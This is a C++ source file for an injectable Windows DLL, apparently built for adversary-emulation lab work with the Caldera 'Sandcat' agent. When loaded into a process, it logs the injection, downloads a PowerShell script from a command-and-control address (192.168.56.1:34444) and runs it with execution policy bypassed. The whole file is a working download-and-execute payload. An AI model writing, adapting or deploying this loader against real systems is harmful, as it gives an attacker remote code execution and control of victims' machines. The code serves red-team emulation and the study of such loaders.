// payload.cpp - Sandcat Download Payload
#include <windows.h>
#include <wininet.h>
#include <fstream>

#pragma comment(lib, "wininet.lib")

void WriteLog(const char* message) {
    std::ofstream log("C:\\Windows\\Temp\\injection_log.txt", std::ios::app);
    if (log.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timestamp[64];
        snprintf(timestamp, sizeof(timestamp), "[%04d-%02d-%02d %02d:%02d:%02d] ", 
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        log << timestamp << message << std::endl;
        log.close();
    }
}

void DownloadSandcat() {
    const char* url = "http://192.168.56.1:34444/agents/sandcat_ttps7.ps1";
    const char* outputPath = "C:\\Windows\\Temp\\sandcat_ttps7.ps1";
    
    WriteLog("Starting Sandcat download...");
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        WriteLog("Failed to initialize WinINet");
        return;
    }
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        WriteLog("Failed to connect to URL");
        InternetCloseHandle(hInternet);
        return;
    }
    
    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile.is_open()) {
        WriteLog("Failed to create output file");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    
    char buffer[4096];
    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outFile.write(buffer, bytesRead);
        totalBytes += bytesRead;
    }
    
    outFile.close();
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    if (totalBytes > 0) {
        char logMsg[256];
        snprintf(logMsg, sizeof(logMsg), "Downloaded %d bytes, executing...", totalBytes);
        WriteLog(logMsg);
        
        // PowerShell로 실행
        char command[512];
        snprintf(command, sizeof(command), 
                 "powershell.exe -ExecutionPolicy Bypass -File \"%s\"", outputPath);
        
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        
        if (CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            WriteLog("Sandcat executed successfully");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            WriteLog("Failed to execute Sandcat");
        }
    }
    char logMsg[256];
    snprintf(logMsg, sizeof(logMsg), "Sandcat downloaded: %d bytes -> %s", totalBytes, outputPath);
    WriteLog(logMsg);
    
    MessageBoxA(NULL, logMsg, "Download Complete", MB_OK | MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DWORD pid = GetCurrentProcessId();
        char processName[MAX_PATH];
        GetModuleFileNameA(NULL, processName, MAX_PATH);
        
        char logMsg[512];
        snprintf(logMsg, sizeof(logMsg), "Injected into PID: %d, Process: %s", pid, processName);
        WriteLog(logMsg);
        
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DownloadSandcat, NULL, 0, NULL);
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void Execute() {
    DownloadSandcat();
}